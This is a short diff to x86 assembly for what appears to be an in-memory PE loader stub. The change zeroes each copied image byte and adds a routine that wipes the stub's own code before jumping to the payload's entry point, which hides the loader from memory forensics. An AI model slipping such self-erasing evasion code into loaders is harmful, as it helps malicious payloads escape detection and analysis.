@@ -142,12 +142,23 @@ complete:
   pop ecx                 ; Pop the image_size to ECX
 memcpy:
   mov al,[esi]            ; Move 1 byte of PE image to AL register
-  mov [edx],al            ; Move 1 byte of PE image to image base
+  mov byte [edx],al       ; Move 1 byte of PE image to image base
+  mov byte [esi],0        ; Overwrite copied byte (for less memory footprint) 
   inc esi                 ; Increase PE image index
   inc edx                 ; Increase image base index
   loop memcpy             ; Loop until ECX = 0
-PE_Start:
-  jmp edi                ; Call PE AOE
+  jmp PE_start
 
 ; ========== API ==========
 %include "CRC32_API/x86_crc32_api.asm"
+
+PE_start:
+  mov ecx,wipe                    ; Get the number of bytes until wipe label
+  call wipe_start                 ; Call wipe_start
+wipe_start:
+  pop eax                         ; Get EIP to EAX
+wipe:
+  mov byte [eax],0                ; Wipe 1 byte at a time
+  dec eax                         ; Decraise EAX
+  loop wipe                       ; Loop until ECX = 0
+  jmp edi                         ; Call the AOE
